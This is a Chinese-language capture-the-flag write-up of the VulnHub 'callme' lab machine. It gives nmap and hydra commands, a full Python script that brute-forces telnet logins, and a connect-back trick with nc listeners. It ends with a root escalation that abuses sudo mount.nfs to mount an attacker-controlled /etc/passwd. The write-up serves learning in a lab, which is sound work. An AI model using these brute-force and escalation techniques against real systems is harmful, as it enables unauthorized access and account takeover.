# [vulnhub]: callme

Time: 2021-2-11

Author: badbird

---

Target: 192.168.31.96

Attack: 192.168.31.100

---

先使用arp-scan来一波主机发现，因为这个比nmap快很多，发现了目标再用nmap扫描单个IP就好。

arp-scan --interface=eth0 --localnet

![image-20210211084249051](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211084249051.png)



nmap -sS -sV -T5 -A 192.168.31.96 (真的是太慢了，不知道有没有啥好的加速参数)

![image-20210211085203192](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211085203192.png)

可以看到，开放了22、111、2323端口。其中发现2323端口有点意思，nmap返回了在2323端口尝试登录的一些信息。（其实22/ssh也可以尝试一下枚举用户名爆破密码，但是2323提示太明显了）

这个端口开放的服务是3d-nfsd，没见过就google一下：

![image-20210211085602751](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211085602751.png)

看到了，telnet服务，连接试试看：

![image-20210211085741900](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211085741900.png)

常用的判断用户是否存在的办法：错误的用户名会提示用户不存在，正确的用户名会提示该用户密码错误。

现在知道了username：admin，接下来就是爆破密码。

尝试使用hydra爆破：

hydra -l admin -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 192.168.31.96 telnet -s 2323

（Seclists是个在github上的密码大集合）

![image-20210211092712275](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211092712275.png)

没等他运行结束，估计是有点问题，随后又尝试了一下metasploit的auxiliary/scanner/telnet/telnet_login模块

依然没有成功，这就有点蹊跷了。此时有两种继续的办法：1.换大字典。2.自己写破解脚本。3.[google国外大佬的wp](https://al1enum.github.io/vulnhub/callme/index.html)

懂的都懂。

这里会想到自己写破解脚本是因为看了大佬的解答。

复习一下[python socket编程](https://www.liaoxuefeng.com/wiki/1016959663602400/1017788916649408)。

最后的脚本:(增加了个没啥用的进度条)。这种脚本的编写是需要根据连接情况和收到的消息进行不断测试修改的，需要确定什么时候、收到多少数据之后应该发送数据，比如用户名密码的输入。

```python
import socket
import time
import sys

print("[~]This is a script for a VM(Callme) for Foxlox")
with open('/usr/share/seclists/Passwords/probable-v2-top1575.txt') as passwords:
    for (passwd,i) in zip(passwords,range(1,1575)):
        print("\r", end="")
        print("Brute force is cracking... {}% ".format(i // (1575/100)), "▋" * (i // (1575//20)),end="")
        username = b'admin'			#设置用户名
        ip = '192.168.31.96'
        port = 2323
        s = socket.socket()
        s.connect((ip, port))		#注意参数是个元组哦
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')		#发送数据一定要加\r\n，符合包的标准。
        s.recv(1024)
        s.send(passwd.strip().encode() + b'\r\n')	#从字典中加载的密码一定要转换成字节字符串
        re = s.recv(1024)
        s.recv(1024)
        sys.stdout.flush()				#清空输出，刷新进度条用的。。。
        time.sleep(0.01)
        if "Wrong password for user admin" not in str(re):		#密码正确的条件
            print("\n[*] Get it! PASSWORD is:")
            print(passwd)
            break

```

运行运行运行结果！

![image-20210211102525825](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211102525825.png)

现在来手工telnet连接一下：

![image-20210211102758169](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211102758169.png)

可以想到我们之前为什么没有破解成功了，根据提示，告诉我们没有准备好，应该是端口号，我们需要在本地监听它返回的这个端口号，然而每次返回的大写英文4位数字都不一样，现在的思路就是，碰运气：

nc在本地监听几个端口（2000~3000内选几个即可），然后循环连接192.168.31.96。等刚好两边端口号对上，我们就能连上了。

![image-20210211103723926](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211103723926.png)

循环登录的话，只需要在刚才破解的代码上做一些修改：

```python
import socket
import time
import sys

print("[~]This is a script for a VM(Callme) for Foxlox")
while True:
    username = b'admin'			#设置用户名
    password = b'booboo'		#设置密码
    ip = '192.168.31.96'
    port = 2323
    s = socket.socket()
    s.connect((ip, port))		#注意参数是个元组哦
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')		#发送数据一定要加\r\n，符合包的标准。
    s.recv(1024)
    s.send(password + b'\r\n')	#从字典中加载的密码一定要转换成字节字符串
    re = s.recv(1024)
    print(s.recv(1024))
```

运行该脚本，等两分钟就会中奖了。

还有一种办法就是写段代码将大写英文数字转换成阿拉伯数字，然后直接执行nc开始监听。它提示端口后会有一点点延迟。

当啷当啷，打字的这会功夫已经中奖了：

![image-20210211105208134](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211105208134.png)

可以看到是wine shell。这就要用   dir	type命令了。

![image-20210211105537852](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211105537852.png)

startup这个文件看意思应该有点用。

![image-20210211111651848](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211111651848.png)

这里又到了知识盲区了，百度recall server看看是个啥

![image-20210211111955252](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211111955252.png)

大概是个记录密码的小工具？

这里用到了[strings命令](https://blog.csdn.net/technologyleader/article/details/81912312)太强了这个命令，打印文件的可打印字符，所有文件。

当然，需要先把recallserver.exe下载到本地，在靶机端用python起个服务就好。python -m http.server 1234

然后用wget下载到本地，

使用strings命令

![image-20210211122229449](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211122229449.png)

查看string.txt，直接搜索pass，得到了个疑似密码的字符串，尝试ssh登录一下fox用户（因为刚才telnet连进去就是fox的目录）。

![image-20210211122354508](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211122354508.png)

![image-20210211124220484](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211124220484.png)

然而当想要sudo su root得到root权限的时候，却得到fox用户不能这么做。。

![image-20210211124356525](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211124356525.png)

查看一下fox的sudo权限：sudo -l

![image-20210211125400606](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211125400606.png)

哦吼，[mount.nfs](https://www.linuxcool.com/mount-nfs)

那么，直接在kali本地新建一个root权限的账户，再用靶机挂载kali的/etc/passwd，这不就相当于在靶机上有了这个用户了吗，且密码是自定义的，使用openssl passwd -1（是1不是l）生成密码哈希值并按照格式写入/etc/passwd

靶机上挂载 /etc

首先要在kali上设置/etc允许被挂载

![image-20210211130246674](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211130246674.png)

启用nfs服务

![image-20210211130501080](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211130501080.png)

靶机上挂载、查看

![image-20210211130442421](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211130442421.png)

![image-20210211130537667](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211130537667.png)

切换到hack用户-->取得root权限-->进入root目录-->get flag

![image-20210211130835349](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210211130835349.png)